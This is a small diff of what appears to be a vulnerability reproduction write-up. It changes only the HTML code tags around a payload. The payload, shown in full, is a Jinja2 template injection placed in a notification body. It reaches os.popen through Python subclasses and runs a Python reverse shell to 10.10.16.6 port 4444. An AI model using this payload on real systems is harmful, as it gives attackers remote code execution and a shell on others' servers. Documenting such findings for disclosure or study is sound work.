@@ -647,7 +647,7 @@ To reproduce, we will be following those steps:
 * Give a dummy title to the notification 
 * In the notification Body we add this payload 
 
-<code>
+<pre><code>
 # Calling os.popen without guessing the index of the class
 &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;
   &#123;% if "warning" in x.__name__ %&#125;
@@ -660,7 +660,7 @@ To reproduce, we will be following those steps:
     &#123;&#123;x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.6\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'").read().zfill(417)&#125;&#125;
   &#123;% endif %&#125;
 &#123;% endfor %&#125;
-</code>
+</code></pre>
 
  `RCE` that opens a `reverse shell` using `jinja2` template payload.  
  
